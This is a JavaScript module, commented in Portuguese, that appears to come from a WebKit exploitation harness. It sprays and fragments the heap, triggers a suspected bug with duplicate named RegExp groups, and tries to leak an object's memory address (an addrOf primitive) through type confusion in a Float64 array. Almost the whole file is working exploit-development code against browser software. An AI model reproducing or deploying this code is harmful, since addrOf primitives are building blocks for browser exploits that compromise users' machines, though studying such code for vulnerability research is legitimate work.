import { Groomer } from '../mod_groomer.js';

export default {
    id:       'REGEXP_GROUP_INTEGER_OVERFLOW',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Caça à Primitiva AddrOf: Focamos no crash dos Grupos Nomeados Duplicados. ' +
        'Tentamos ler a estrutura corrompida do objeto retornado sem usar conversões ' +
        'de string (que causam o TypeError). O objetivo é extrair o ponteiro (0x...).',

    setup: function() {
        this.results = {};
        this.regexps = {};
        
        // A ARMADILHA: Um array nativo de números decimais (Float64).
        // Se conseguirmos empurrar o objeto corrompido para aqui dentro,
        // o C++ pode confundir o endereço do objeto com um número decimal.
        this.addrofArray = [1.1, 2.2, 3.3, 4.4]; 
    },

    trigger: function() {
        // 1. Grooming Massivo: Fragmentamos o Heap de Strings
        let stringTrash = Groomer.sprayStrings(64, 5000);
        Groomer.punchHoles(stringTrash, 3);

        try {
            // 2. A Compilação Maliciosa (Gatilho do Bug)
            this.regexps.dupNamed = new RegExp('(?<name>a)|(?<name>b)');
            
            // 3. Capturamos o Objeto sem aceder a ".groups"
            this.results.rawExec = this.regexps.dupNamed.exec('a');
            
            // 4. A TENTATIVA DE ADDROF
            // Empurramos o objeto mutante para o array numérico. 
            // Se o Type Confusion nativo ocorrer, o índice 0 não guardará 
            // o objeto em si, mas sim o seu ponteiro de memória C++.
            this.addrofArray[0] = this.results.rawExec;
            
        } catch(e) { 
            this.results.error = e.constructor.name; 
        }
    },

    probe: [
        // Probe 0: O objeto foi criado? (typeof protege contra o TypeError)
        s => typeof s.results.rawExec,
        
        // Probe 1: O motor ainda consegue ler a estrutura básica do objeto?
        s => {
            try {
                if (!s.results.rawExec) return 'null';
                return Object.keys(s.results.rawExec).length + ' chaves legíveis';
            } catch(e) {
                return 'Objeto Ilegível (Corrupção Brutal)';
            }
        },
        
        // Probe 2: A LEITURA DO PONTEIRO (ADDR OF)
        s => {
            try {
                let val = s.addrofArray[0];
                
                // Se o valor for um 'number', significa que o Type Confusion resultou
                // e o motor WebKit leu o endereço do objeto como se fosse um Double!
                if (typeof val === 'number' && val !== 1.1) {
                    
                    // Lógica de conversão Float64 -> Hexadecimal (Ponteiro de Memória)
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const ptr = new BigUint64Array(buf)[0];
                    
                    const hexPtr = `0x${ptr.toString(16).padStart(16, '0')}`;
                    return `💥 SUCESSO AddrOf: ${hexPtr}`;
                }
                
                return 'Ainda é tratado como objeto';
            } catch(e) {
                return `Erro no AddrOf: ${e.message}`;
            }
        }
    ],

    cleanup: function() {
        this.results = {};
        this.regexps = {};
        this.addrofArray = null;
    }
};
